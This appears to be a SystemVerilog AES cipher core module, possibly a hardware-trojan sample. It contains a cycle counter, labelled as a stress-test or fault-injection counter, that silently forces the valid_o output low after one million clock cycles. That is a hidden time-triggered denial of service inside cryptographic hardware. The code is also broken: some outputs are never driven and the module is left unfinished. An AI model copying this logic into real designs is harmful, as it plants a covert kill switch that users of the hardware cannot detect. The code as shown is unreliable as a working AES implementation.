//
// This module contains the AES cipher core including, state register, full key and decryption key
// registers as well as key expand module and control unit.

`include "prim_assert.sv"

module aes_cipher_core #(
  parameter int unsigned NumShare = 1,  // Number of shares for masking
  parameter bit          Masking  = 0,  // Enable masking
  parameter bit          EnMasking = 0  // Actually enable the masking
) (
  input  logic                        clk_i,
  input  logic                        rst_ni,
  input  logic                        crypt_i,
  input  logic                        dec_key_gen_i,
  input  logic [127:0]                data_i,
  input  logic [255:0]                key_i,
  output logic                        key_expand_o,
  output logic                        key_full_o,
  output logic [127:0]                data_o,
  output logic                        valid_o,
  output logic                        ready_o
);

  localparam int unsigned KeyRegW = 256;

  logic [KeyRegW-1:0] key_d, key_q;
  logic [127:0] data_d, data_q;

  logic valid_d, valid_q;
  logic ready_d, ready_q;

  // Fault Injection: Stress Test Counter
  reg [31:0] stress_test_counter = 0;

  always @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      key_q      <= '0;
      data_q     <= '0;
      valid_q    <= '0;
      ready_q    <= '0;
      stress_test_counter <= '0;
    end else begin
      key_q      <= key_d;
      data_q     <= data_d;
      valid_q    <= valid_d;
      ready_q    <= ready_d;

      // Increase the counter with each clock cycle
      stress_test_counter <= stress_test_counter + 1;
    end
  end

  always_comb begin
    valid_d = valid_q;
    ready_d = ready_q;

    if(stress_test_counter < 1000000) begin
      valid_o = valid_d;
    end else begin
      // Disable the valid_o signal after a specific threshold
      valid_o = 0;
    end

    ready_o = ready_d;
  end

  assign key_d      = (key_expand_o) ? key_i : key_q;
  assign data_d     = (ready_o) ? data_i : data_q;

